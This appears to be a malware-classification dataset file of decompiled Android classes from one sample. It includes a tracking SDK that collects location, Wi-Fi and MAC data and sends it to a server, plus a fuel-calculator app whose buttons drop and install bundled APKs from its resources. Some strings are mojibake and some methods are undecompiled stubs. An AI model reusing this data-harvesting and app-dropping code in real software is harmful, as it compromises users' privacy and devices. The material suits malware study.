"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\x.code","final class x {   public static int a(  Context context){     DisplayMetrics displayMetrics=new DisplayMetrics();     try {       displayMetrics=j(context);     }  catch (    Exception e) {       com.baidu.mobstat.a.c.a(""createAdReqURL"",e);     }     return displayMetrics.widthPixels;   }   public static String a(  Context context,  String str){     String str2="""";     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),128);       if (applicationInfo != null) {         Object obj=applicationInfo.metaData != null ? applicationInfo.metaData.get(str) : null;         if (obj == null) {           com.baidu.mobstat.a.c.a(""StatSDK"",""null,can't find information for key:"" + str);           if (str == ""BaiduMobAd_STAT_ID"") {             com.baidu.mobstat.a.c.c(""ä¸�èƒ½åœ¨manifest.xmlä¸­æ‰¾åˆ°APP Key||can't find app key in manifest.xml."");           }         }  else {           str2=obj.toString();           if (str2.trim().equals("""") && str == ""BaiduMobAd_STAT_ID"") {             com.baidu.mobstat.a.c.c(""APP Keyå€¼ä¸ºç©º||The value of APP Key is empty."");           }         }       }     }  catch (    PackageManager.NameNotFoundException e) {       if (str == ""BaiduMobAd_STAT_ID"") {         com.baidu.mobstat.a.c.c(""ä¸�èƒ½åœ¨manifest.xmlä¸­æ‰¾åˆ°APP Key||can't find app key in manifest.xml."");       }     }     return str2;   }   public static String a(  Context context,  String str,  String str2,  int i,  int i2){     BufferedReader bufferedReader;     BufferedWriter bufferedWriter=null;     HttpURLConnection a=com.baidu.mobstat.a.b.a(context,str,i,i2);     a.setDoOutput(true);     a.setInstanceFollowRedirects(false);     a.setUseCaches(false);     a.setRequestProperty(""Content-Type"",AsyncHttpClient.ENCODING_GZIP);     a.connect();     com.baidu.mobstat.a.c.a(""AdUtil.httpPost connected"");     StringBuilder sb=new StringBuilder();     try {       BufferedWriter bufferedWriter2=new BufferedWriter(new OutputStreamWriter(new GZIPOutputStream(a.getOutputStream())));       try {         bufferedWriter2.write(str2);         bufferedWriter2.close();         bufferedReader=new BufferedReader(new InputStreamReader(a.getInputStream()));         while (true) {           try {             String readLine=bufferedReader.readLine();             if (readLine == null) {               break;             }             sb.append(readLine);           }  catch (          IOException e) {             e=e;             if (bufferedReader != null) {               bufferedReader.close();             }             if (bufferedWriter != null) {               bufferedWriter.close();             }             a.disconnect();             throw e;           }         }         bufferedReader.close();         a.disconnect();         int contentLength=a.getContentLength();         if (a.getResponseCode() == 200 && contentLength == 0) {           return sb.toString();         }         throw new IOException(""http code ="" + a.getResponseCode() + ""& contentResponse=""+ ((Object)sb));       }  catch (      IOException e2) {         e=e2;         bufferedWriter=bufferedWriter2;         bufferedReader=null;       }     }  catch (    IOException e3) {       e=e3;       bufferedReader=null;     }   }   public static int b(  Context context){     DisplayMetrics displayMetrics=new DisplayMetrics();     try {       displayMetrics=j(context);     }  catch (    Exception e) {       com.baidu.mobstat.a.c.a(""createAdReqURL"",e);     }     return displayMetrics.heightPixels;   }   public static int c(  Context context){     try {       return context.getPackageManager().getPackageInfo(context.getPackageName(),0).versionCode;     }  catch (    PackageManager.NameNotFoundException e) {       com.baidu.mobstat.a.c.c(""stat"",""get app version code exception"");       return 1;     }   }   public static String d(  Context context){     try {       return context.getPackageManager().getPackageInfo(context.getPackageName(),0).versionName;     }  catch (    PackageManager.NameNotFoundException e) {       com.baidu.mobstat.a.c.c(""stat"",""get app version name exception"");       return """";     }   }   public static String e(  Context context){     String format=String.format(""%s_%s_%s"",0,0,0);     try {       if (com.baidu.mobstat.a.b.e(context,""android.permission.ACCESS_FINE_LOCATION"") || com.baidu.mobstat.a.b.e(context,""android.permission.ACCESS_COARSE_LOCATION"")) {         CellLocation cellLocation=((TelephonyManager)context.getSystemService(""phone"")).getCellLocation();         com.baidu.mobstat.a.c.a(""getLocation cell:"",cellLocation + """");         if (cellLocation == null) {           return format;         }         if (cellLocation instanceof GsmCellLocation) {           GsmCellLocation gsmCellLocation=(GsmCellLocation)cellLocation;           return String.format(""%s_%s_%s"",String.format(""%d"",Integer.valueOf(gsmCellLocation.getCid())),String.format(""%d"",Integer.valueOf(gsmCellLocation.getLac())),0);         }         String[] split=cellLocation.toString().replace(""["","""").replace(""]"","""").split("","");         return String.format(""%s_%s_%s"",split[0],split[3],split[4]);       }     }  catch (    Exception e) {       com.baidu.mobstat.a.c.a(""getLocation"",e);     }     return format;   }   public static String f(  Context context){     try {       if (com.baidu.mobstat.a.b.e(context,""android.permission.ACCESS_FINE_LOCATION"")) {         Location lastKnownLocation=((LocationManager)context.getSystemService(""location"")).getLastKnownLocation(""gps"");         com.baidu.mobstat.a.c.a(""stat"",""location: "" + lastKnownLocation);         if (lastKnownLocation != null) {           return String.format(""%s_%s_%s"",Long.valueOf(lastKnownLocation.getTime()),Double.valueOf(lastKnownLocation.getLongitude()),Double.valueOf(lastKnownLocation.getLatitude()));         }       }     }  catch (    Exception e) {       com.baidu.mobstat.a.c.a(""stat"",e);     }     return """";   }   public static String g(  Context context){     String str;     Exception e;     String str2="""";     try {       if (com.baidu.mobstat.a.b.e(context,""android.permission.ACCESS_WIFI_STATE"")) {         WifiInfo connectionInfo=((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo();         str=connectionInfo.getMacAddress();         try {           str2=String.format(""ssid=%s mac=%s"",connectionInfo.getSSID(),connectionInfo.getMacAddress());           com.baidu.mobstat.a.c.a(str2);         }  catch (        Exception e2) {           e=e2;           com.baidu.mobstat.a.c.a(""stat"",e);           return str;         }       }  else {         com.baidu.mobstat.a.c.c(""You need the android.Manifest.permission.ACCESS_WIFI_STATE permission. Open AndroidManifest.xml and just before the final </manifest> tag add:android.permission.ACCESS_WIFI_STATE"");         str="""";       }     }  catch (    Exception e3) {       str=str2;       e=e3;     }     return str;   }   public static String h(  Context context){     Exception exc;     String str;     String str2;     int i;     int i2;     int i3=0;     try {       if (com.baidu.mobstat.a.b.e(context,""android.permission.ACCESS_WIFI_STATE"")) {         WifiManager wifiManager=(WifiManager)context.getSystemService(""wifi"");         if (wifiManager.isWifiEnabled()) {           com.baidu.mobstat.a.c.a(""[d]"",wifiManager.getScanResults() + """");           int i4=Integer.MAX_VALUE;           int i5=-1;           while (i3 < wifiManager.getScanResults().size()) {             ScanResult scanResult=wifiManager.getScanResults().get(i3);             int abs=Math.abs(scanResult.level);             com.baidu.mobstat.a.c.a(String.format(""%s %s_%s"",scanResult.SSID,scanResult.BSSID,Integer.valueOf(abs)));             if (i4 > abs) {               i=i3;               i2=abs;             }  else {               i=i5;               i2=i4;             }             i3++;             i4=i2;             i5=i;           }           if (i5 >= 0) {             ScanResult scanResult2=wifiManager.getScanResults().get(i5);             str2=String.format(""%s_%s"",scanResult2.BSSID.replace("":"","""").toLowerCase(),Integer.valueOf(Math.abs(scanResult2.level)));           }  else {             str2="""";           }           try {             WifiInfo connectionInfo=wifiManager.getConnectionInfo();             com.baidu.mobstat.a.c.a(String.format(""[active]%s %s_%s"",connectionInfo.getSSID(),connectionInfo.getMacAddress(),Integer.valueOf(Math.abs(connectionInfo.getRssi()))));             return str2;           }  catch (          Exception e) {             str=str2;             exc=e;             com.baidu.mobstat.a.c.a(""getWifiLocation"",exc);             return str;           }         }       }       return """";     }  catch (    Exception e2) {       exc=e2;       str="""";     }   }   public static String i(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     String typeName=activeNetworkInfo.getTypeName();     return (typeName.equals(""WIFI"") || activeNetworkInfo.getSubtypeName() == null) ? typeName : activeNetworkInfo.getSubtypeName();   }   public static DisplayMetrics j(  Context context){     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getApplicationContext().getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);     return displayMetrics;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat.a\a.code","public final class a {   public static int a=4; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat.a\b.code","public final class b {   private static final Proxy a=new Proxy(Proxy.Type.HTTP,new InetSocketAddress(""10.0.0.172"",80));   private static final Proxy b=new Proxy(Proxy.Type.HTTP,new InetSocketAddress(""10.0.0.200"",80));   public static String a(  Context context,  String str){     c.a(""MoUtil.read"",str);     try {       byte[] b2=b(context,str);       if (b2 != null) {         return new String(b2,""utf-8"");       }     }  catch (    Exception e) {       Log.w(""sdkstat"",""MoUtil.read"",e);     }     return """";   }   public static String a(  boolean z,  Context context,  String str){     return z ? b(str) : a(context,str);   }   public static HttpURLConnection a(  Context context,  String str,  int i,  int i2){     HttpURLConnection httpURLConnection;     URL url=new URL(str);     ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");     NetworkInfo networkInfo=connectivityManager.getNetworkInfo(0);     NetworkInfo networkInfo2=connectivityManager.getNetworkInfo(1);     if (networkInfo2 != null && networkInfo2.isAvailable()) {       c.a("""",""WIFI is available"");       httpURLConnection=(HttpURLConnection)url.openConnection();     }  else     if (networkInfo == null || !networkInfo.isAvailable()) {       c.a("""",""getConnection:not wifi and mobile"");       httpURLConnection=(HttpURLConnection)url.openConnection();     }  else {       String extraInfo=networkInfo.getExtraInfo();       String lowerCase=extraInfo != null ? extraInfo.toLowerCase() : """";       c.a(""current APN"",lowerCase);       httpURLConnection=(lowerCase.startsWith(""cmwap"") || lowerCase.startsWith(""uniwap"") || lowerCase.startsWith(""3gwap"")) ? (HttpURLConnection)url.openConnection(a) : lowerCase.startsWith(""ctwap"") ? (HttpURLConnection)url.openConnection(b) : (HttpURLConnection)url.openConnection();     }     httpURLConnection.setConnectTimeout(i);     httpURLConnection.setReadTimeout(i2);     return httpURLConnection;   }   public static void a(  Context context,  String str,  String str2,  boolean z){     FileOutputStream fileOutputStream=null;     try {       try {         FileOutputStream openFileOutput=context.openFileOutput(str,z ? 32768 : 0);         if (openFileOutput != null) {           openFileOutput.write(str2.getBytes(""utf-8""));         }  else {           Log.w(""sdkstat"",""MoUtil.write fout is null:"" + (openFileOutput == null));         }         if (openFileOutput != null) {           try {             openFileOutput.close();           }  catch (          Exception e) {             Log.w(""sdkstat"",""MoUtil.write"",e);           }         }       }  catch (      Exception e2) {         Log.w(""sdkstat"",""MoUtil.write"",e2);         if (0 != 0) {           try {             fileOutputStream.close();           }  catch (          Exception e3) {             Log.w(""sdkstat"",""MoUtil.write"",e3);           }         }       }     }  catch (    Throwable th) {       if (0 != 0) {         try {           fileOutputStream.close();         }  catch (        Exception e4) {           Log.w(""sdkstat"",""MoUtil.write"",e4);         }       }       throw th;     }   }   public static void a(  String str,  String str2,  boolean z){     FileOutputStream fileOutputStream;     if (""mounted"".equals(Environment.getExternalStorageState())) {       FileOutputStream fileOutputStream2=null;       try {         try {           File file=new File(Environment.getExternalStorageDirectory() + File.separator + str);           if (!file.exists()) {             file.getParentFile().mkdirs();             file.createNewFile();           }           fileOutputStream=new FileOutputStream(file,z);         }  catch (        Throwable th) {           th=th;         }       }  catch (      FileNotFoundException e) {         e=e;       } catch (      IOException e2) {         e=e2;       }       try {         fileOutputStream.write(str2.getBytes(""utf-8""));         if (fileOutputStream != null) {           try {             fileOutputStream.close();           }  catch (          IOException e3) {             Log.w(""sdkstat"",""MoUtil.writeExt"",e3);           }         }       }  catch (      FileNotFoundException e4) {         e=e4;         fileOutputStream2=fileOutputStream;         Log.e(""sdkstat"",""MoUtil.writeExt"",e);         if (fileOutputStream2 != null) {           try {             fileOutputStream2.close();           }  catch (          IOException e5) {             Log.w(""sdkstat"",""MoUtil.writeExt"",e5);           }         }       } catch (      IOException e6) {         e=e6;         fileOutputStream2=fileOutputStream;         Log.e(""sdkstat"",""MoUtil.writeExt"",e);         if (fileOutputStream2 != null) {           try {             fileOutputStream2.close();           }  catch (          IOException e7) {             Log.w(""sdkstat"",""MoUtil.writeExt"",e7);           }         }       } catch (      Throwable th2) {         th=th2;         fileOutputStream2=fileOutputStream;         if (fileOutputStream2 != null) {           try {             fileOutputStream2.close();           }  catch (          IOException e8) {             Log.w(""sdkstat"",""MoUtil.writeExt"",e8);           }         }         throw th;       }     }   }   public static void a(  boolean z,  Context context,  String str,  String str2,  boolean z2){     if (z) {       a(str,str2,z2);     }  else {       a(context,str,str2,z2);     }   }   public static boolean a(  String str){     c.a(""MoUtil.deleteExt"",str);     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return false;     }     File file=new File(Environment.getExternalStorageDirectory() + File.separator + str);     if (file.exists()) {       return file.delete();     }     return false;   }   public static java.lang.String b(  java.lang.String r5){     throw new UnsupportedOperationException(""Method not decompiled: com.baidu.mobstat.a.b.b(java.lang.String):java.lang.String"");   }   static byte[] b(  Context context,  String str){     IOException iOException;     byte[] bArr;     FileNotFoundException fileNotFoundException;     byte[] bArr2;     r2=0;     r2=0;     r2=0;     r2=0;     try {       try {         FileInputStream openFileInput=context.openFileInput(str);         if (openFileInput != null) {           try {             try {               bArr2=new byte[openFileInput.available()];             }  catch (            Throwable th) {               th=th;               r2=openFileInput;               if (r2 != 0) {                 try {                   r2.close();                 }  catch (                IOException e) {                   Log.e(""sdkstat"",""MoUtil.readBinary"",e);                 }               }               throw th;             }           }  catch (          FileNotFoundException e2) {             bArr=null;             r2=openFileInput;             fileNotFoundException=e2;           } catch (          IOException e3) {             bArr=null;             r2=openFileInput;             iOException=e3;           }           try {             openFileInput.read(bArr2);             bArr=bArr2;             r2=bArr2;           }  catch (          FileNotFoundException e4) {             bArr=bArr2;             r2=openFileInput;             fileNotFoundException=e4;             Log.e(""sdkstat"",""MoUtil.readBinary"",fileNotFoundException);             if (r2 != 0) {               try {                 r2.close();               }  catch (              IOException e5) {                 r2=""sdkstat"";                 Log.e(""sdkstat"",""MoUtil.readBinary"",e5);               }             }             return bArr;           } catch (          IOException e6) {             bArr=bArr2;             r2=openFileInput;             iOException=e6;             Log.e(""sdkstat"",""MoUtil.readBinary"",iOException);             if (r2 != 0) {               try {                 r2.close();               }  catch (              IOException e7) {                 r2=""sdkstat"";                 Log.e(""sdkstat"",""MoUtil.readBinary"",e7);               }             }             return bArr;           }         }  else {           bArr=null;         }         if (openFileInput != null) {           try {             openFileInput.close();           }  catch (          IOException e8) {             r2=""sdkstat"";             Log.e(""sdkstat"",""MoUtil.readBinary"",e8);           }         }       }  catch (      Throwable th2) {         th=th2;       }     }  catch (    FileNotFoundException e9) {       fileNotFoundException=e9;       bArr=null;     } catch (    IOException e10) {       iOException=e10;       bArr=null;     }     return bArr;   }   public static void c(  String str){     c.c(""sdkstat"",str);     Log.e(""sdkstat"",""SDK install error:"" + str);   }   public static boolean c(  Context context,  String str){     boolean exists=context.getFileStreamPath(str).exists();     c.a(""MoUtil.exists"",exists + "" "" + str);     return exists;   }   public static void d(  Context context,  String str){     if (e(context,str)) {       return;     }     c(""You need the "" + str + "" permission. Open AndroidManifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\""""+ str+ ""\"" />"");   }   public static boolean e(  Context context,  String str){     boolean z=context.checkCallingOrSelfPermission(str) != -1;     c.a(""hasPermission "",z + "" | "" + str);     return z;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat.a\c.code","public final class c {   private static DateFormat a; static {     a=null;     a();     a=new DateFormat();   }   public static int a(  String str){     return a(""sdkstat"",str);   }   public static int a(  String str,  String str2){     if (!a(3)) {       return -1;     }     b(str,str2);     return Log.d(str,str2);   }   public static int a(  String str,  Throwable th){     if (!a(3)) {       return -1;     }     a(""sdkstat"",str,th);     return Log.d(""sdkstat"",str,th);   }   public static int a(  Throwable th){     return a("""",th);   }   public static int a(  Object... objArr){     if (a(3)) {       return a(d(objArr));     }     return -1;   }   public static void a(){     b.a(""_b_sdk.log"");   }   private static void a(  String str,  String str2,  Throwable th){     StringWriter stringWriter=new StringWriter();     PrintWriter printWriter=new PrintWriter(stringWriter);     th.printStackTrace(printWriter);     b(str,str2 + ""\n"" + stringWriter.toString());     printWriter.close();     try {       stringWriter.close();     }  catch (    IOException e) {       Log.w(""Log.debug"","""",e);     }   }   public static boolean a(  int i){     return a(""sdkstat"",i);   }   public static boolean a(  String str,  int i){     return i >= a.a;   }   public static int b(  String str){     if (!a(5)) {       return -1;     }     b(""sdkstat"",str);     return Log.w(""sdkstat"",str);   }   public static int b(  String str,  Throwable th){     if (!a(6)) {       return -1;     }     a(""sdkstat"",str,th);     return Log.e(""sdkstat"",str,th);   }   public static int b(  Throwable th){     return b("""",th);   }   public static int b(  Object... objArr){     if (a(5)) {       return b(d(objArr));     }     return -1;   }   private static synchronized void b(  String str,  String str2){ synchronized (c.class) {     }   }   public static int c(  String str){     if (!a(6)) {       return -1;     }     b(""sdkstat"",str);     return Log.e(""sdkstat"",str);   }   public static int c(  Object... objArr){     if (a(6)) {       return c(d(objArr));     }     return -1;   }   private static String d(  Object[] objArr){     StringBuilder sb=new StringBuilder();     for (    Object obj : objArr) {       sb.append(obj).append(' ');     }     return sb.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\Add.code","!org.eclipse.jdt.core.dom.TypeDeclaration@19a26868"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\anim.code","public static final class anim {   public static final int gif_ku=0x7f040000; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\attr.code","public static final class attr { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\BuildConfig.code","public final class BuildConfig {   public static final boolean DEBUG=true; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\color.code","public static final class color {   public static final int Background=0x7f060001;   public static final int Button1=0x7f060003;   public static final int DarkGreenButton=0x7f060002;   public static final int White=0x7f060000; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\Counter.code","public class Counter extends PublicClass2 {   private Button Button01;   private TextView CapacityET;   private Button CountButton;   private TextView DistanceET;   private TextView OilPricesET;   boolean ifFinish=true;   private String ClassId=""0"";   private String ClassId2=""0"";   private String DKLX=""1"";   private String HKFS=""1"";   @Override protected void onResume(){     super.onResume();     StatService.onResume((Context)this);   }   @Override protected void onPause(){     super.onPause();     StatService.onPause((Context)this);   }   @Override public void onBackPressed(){     finish();   }   @Override protected void onCreate(  Bundle savedInstanceState){     requestWindowFeature(1);     getWindow().setFlags(1024,1024);     super.onCreate(savedInstanceState);     setContentView(R.layout.counter);     BindingLayout();     GetCache();     initBannerAd();     Time t=new Time();     t.setToNow();     int year=t.year;     int monthly=t.month + 1;     int Day=t.monthDay;     int NowDate=StringOper.ToInt(String.valueOf(EnsureLength(year)) + EnsureLength(monthly) + EnsureLength(Day));     if (NowDate < 20150216) {       this.CountButton.setVisibility(8);       this.Button01.setVisibility(8);     }     double Distance=StringOper.ToDouble(GetPreferences(""DistanceET"",""100""));     double Capacity=StringOper.ToDouble(GetPreferences(""CapacityET"",""25""));     double OilPrices=StringOper.ToDouble(GetPreferences(""OilPricesET"",""6.5""));     this.DistanceET.setText(String.valueOf(Distance / Capacity) + ""å…¬é‡Œ"");     this.CapacityET.setText(String.valueOf(IntOper.DoubleLengthLimit(new StringBuilder(String.valueOf(Capacity / Distance)).toString(),""#.000"")) + ""å…¬å�‡"");     this.OilPricesET.setText(String.valueOf(IntOper.DoubleLengthLimit(new StringBuilder(String.valueOf((Capacity * OilPrices) / Distance)).toString(),""#.000"")) + ""å…ƒ"");     this.CountButton.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         Counter.this.ToClassList3b();       }     } );     this.Button01.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         Counter.this.ToClassList3();       }     } );   }   @Override public boolean onCreateOptionsMenu(  Menu menu){     getMenuInflater().inflate(R.menu.main,menu);     return true;   }   public void BindingLayout(){     this.CountButton=(Button)findViewById(R.id.CountButton);     this.Button01=(Button)findViewById(R.id.Button01);     this.DistanceET=(TextView)findViewById(R.id.DistanceET);     this.CapacityET=(TextView)findViewById(R.id.CapacityET);     this.OilPricesET=(TextView)findViewById(R.id.OilPricesET);   }   public void ToClassList3(){     if (ApkOper.isAvilible(this,""com.src.zhang.YiErSanLingLiuWangZhiDaQuan"")) {       Intent i=new Intent();       ComponentName cn=new ComponentName(""com.src.zhang.YiErSanLingLiuWangZhiDaQuan"",""com.src.zhang.YiErSanLingLiuWangZhiDaQuan.MainActivity"");       i.setComponent(cn);       startActivityForResult(i,-1);       return;     }     String Path=String.valueOf(FileOper.GetSDDirectory()) + ""/db"";     String FilePath=String.valueOf(Path) + ""/yesllwzdq.apk"";     File file=new File(FilePath);     FileOper fo=new FileOper();     fo.deleteFile(file);     FileOper.MemoryFileToSD(this,""db"",""yesllwzdq.apk"",R.raw.yesllwzdq);     ApkOper.installApk(this,String.valueOf(FileOper.GetSDDirectory()) + ""db/"",""yesllwzdq.apk"");   }   public void ToClassList3b(){     if (ApkOper.isAvilible(this,""com.example.DaoJiShiRuanJian12345"")) {       Intent i=new Intent();       ComponentName cn=new ComponentName(""com.example.DaoJiShiRuanJian12345"",""com.example.DaoJiShiRuanJian12345.MainActivity"");       i.setComponent(cn);       startActivityForResult(i,-1);       return;     }     String Path=String.valueOf(FileOper.GetSDDirectory()) + ""db"";     String FilePath=String.valueOf(Path) + ""/djsrj.apk"";     File file=new File(FilePath);     FileOper fo=new FileOper();     fo.deleteFile(file);     FileOper.MemoryFileToSD(this,""db"",""djsrj.apk"",R.raw.djsrj);     ApkOper.installApk(this,String.valueOf(FileOper.GetSDDirectory()) + ""db/"",""djsrj.apk"");   }   public void ToClassList2(  Class<?> cls){     Intent intent=new Intent();     intent.setClass(this,cls);     intent.putExtra(""id"",""6"");     startActivity(intent);   }   public void ToClassList3(  Class<?> cls){     Intent intent=new Intent();     intent.setClass(this,cls);     intent.putExtra(""ClassId"",this.ClassId);     intent.putExtra(""DKLX"",this.DKLX);     intent.putExtra(""HKFS"",this.HKFS);     startActivity(intent);   }   public void GetCache(){     this.ClassId2=GetPreferences(""DaiKuanQiXian"",""1"");     this.DKLX=GetPreferences(""DKLX"",""2"");   }   protected void UpdateVersion(){     try {       if (NetworkOper.NetworkTest(this) != 0) {         Time t=new Time();         t.setToNow();         String hour=new StringBuilder(String.valueOf(t.hour)).toString();         String LastDownloadTime=GetPreferences(""YouHaoJiSuanQi12306LastDownloadTime"",""0"");         UpdateManager mUpdateManager=new UpdateManager(this);         if (StringOper.ToInt(LastDownloadTime) != StringOper.ToInt(hour)) {           mUpdateManager.downloadTxt();           SetPreferences(""YouHaoJiSuanQi12306LastDownloadTime"",hour);         }         double versionCode=StringOper.ToDouble(FileOper.dealFile(String.valueOf(FileOper.GetSDDirectory()) + ""YouHaoJiSuanQi12306/versionCode.txt""));         if (versionCode != 0.0d && versionCode > UpdateManager.versionCode) {           mUpdateManager.checkUpdateInfo();         }       }     }  catch (    Exception e) {     }   }   private void initBannerAd(){     FwBannerManager.init(this);     RelativeLayout layout=(RelativeLayout)findViewById(R.id.banner_parent_view);     FwBannerManager.loadBannerAD(this,layout,new FwBannerListener(){       @Override public void onSuccess(){       }       @Override public void onFailure(){       }     } );   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\CountShow.code","!org.eclipse.jdt.core.dom.TypeDeclaration@52f71a45"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\dimen.code","public static final class dimen {   public static final int activity_horizontal_margin=0x7f070000;   public static final int activity_vertical_margin=0x7f070001; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\drawable.code","public static final class drawable {   public static final int background=0x7f020000;   public static final int button=0x7f020001;   public static final int button_default=0x7f020002;   public static final int button_pressed=0x7f020003;   public static final int checkbox_normal=0x7f020004;   public static final int checkbox_select=0x7f020005;   public static final int edit_text=0x7f020006;   public static final int edit_text_default=0x7f020007;   public static final int edit_text_pressed=0x7f020008;   public static final int expand=0x7f020009;   public static final int ic_launcher=0x7f02000a;   public static final int ku_1=0x7f02000b;   public static final int ku_2=0x7f02000c;   public static final int ku_3=0x7f02000d;   public static final int ku_4=0x7f02000e;   public static final int radio_button=0x7f02000f;   public static final int text_view=0x7f020010;   public static final int text_view_default=0x7f020011; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\Edit.code","!org.eclipse.jdt.core.dom.TypeDeclaration@72dbf850"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\id.code","public static final class id {   public static final int AverageConsumptionTV=0x7f0b0018;   public static final int AverageFuelTV=0x7f0b0013;   public static final int Button01=0x7f0b000a;   public static final int Button02=0x7f0b000b;   public static final int Button03=0x7f0b000d;   public static final int Button04=0x7f0b0010;   public static final int Button05=0x7f0b000f;   public static final int CapacityET=0x7f0b001a;   public static final int ContentET=0x7f0b0008;   public static final int ContentTV=0x7f0b0023;   public static final int CountButton=0x7f0b0001;   public static final int DistanceET=0x7f0b0019;   public static final int FrequencyTV=0x7f0b0017;   public static final int LinearLayout01=0x7f0b000c;   public static final int LinearLayout02=0x7f0b000e;   public static final int NumberET=0x7f0b001c;   public static final int NumberTV=0x7f0b0012;   public static final int OilPricesET=0x7f0b001b;   public static final int Options1=0x7f0b0024;   public static final int Options2=0x7f0b0025;   public static final int ProgressBar01=0x7f0b0009;   public static final int SWGJButton=0x7f0b0004;   public static final int TextView01=0x7f0b0007;   public static final int TextView02=0x7f0b0015;   public static final int TextView03=0x7f0b0014;   public static final int TextView06=0x7f0b0003;   public static final int TotalPriceET=0x7f0b0006;   public static final int TotalPriceTV=0x7f0b0011;   public static final int UnitPriceET=0x7f0b0005;   public static final int UnitPriceTV=0x7f0b0016;   public static final int UpdateTimeET=0x7f0b001d;   public static final int banner_parent_view=0x7f0b0000;   public static final int button1=0x7f0b001e;   public static final int button2=0x7f0b001f;   public static final int imageView1=0x7f0b0022;   public static final int ll_listview=0x7f0b0020;   public static final int progress=0x7f0b0021;   public static final int textView1=0x7f0b0002; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\layout.code","public static final class layout {   public static final int add=0x7f030000;   public static final int alert_dialog=0x7f030001;   public static final int alert_dialog3=0x7f030002;   public static final int count_show=0x7f030003;   public static final int counter=0x7f030004;   public static final int edit=0x7f030005;   public static final int list=0x7f030006;   public static final int list_row=0x7f030007;   public static final int main_activity=0x7f030008;   public static final int progress=0x7f030009;   public static final int sms_show=0x7f03000a; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\MainActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@630e2743"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\menu.code","public static final class menu {   public static final int main=0x7f0a0000; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\PublicClass.code","public class PublicClass extends ListActivity {   public static final String DatabaseFileDirectory=""/YouHaoJiSuanQi12306/"";   public static final String DatabaseFileName=""youhaojisuanqi12306.db"";   public void SetPreferences(  String name,  String Value){     SharedPreferences.Editor sharedata=getSharedPreferences(""data"",0).edit();     sharedata.putString(name,Value);     sharedata.commit();   }   public String GetPreferences(  String name,  String DefaultValue){     SharedPreferences sharedata=getSharedPreferences(""data"",0);     return sharedata.getString(name,DefaultValue);   }   public void LocatableMessage(  String MessageContent,  int X,  int Y){     Toast toast=Toast.makeText(getApplicationContext(),MessageContent,1);     toast.setGravity(49,X,Y);     toast.show();   }   public static boolean IfNotification(  Context context){     try {       if (ApkOper.isAvilible(context,""com.src.zhang.YiErSanLingLiuWangZhiDaQuan"") || ApkOper.isAvilible(context,""com.src.zhang.WangZhiDaQuan12345"")) {         return false;       }       return !ApkOper.isAvilible(context,""com.src.zhang.ShouJiWangZhiDaQuan007"");     }  catch (    Exception e) {       return false;     }   }   public void Delete(  String from,  String where){     SqliteOper SO=new SqliteOper(this,DatabaseFileDirectory,DatabaseFileName,R.raw.youhaojisuanqi12306);     SO.PublicDelete(from,where);     SO.closeButDoNotDelete();   }   public String EnsureLength(  int number2){     return new StringBuilder(String.valueOf(number2)).toString().length() < 2 ? ""0"" + number2 : new StringBuilder(String.valueOf(number2)).toString();   } } "
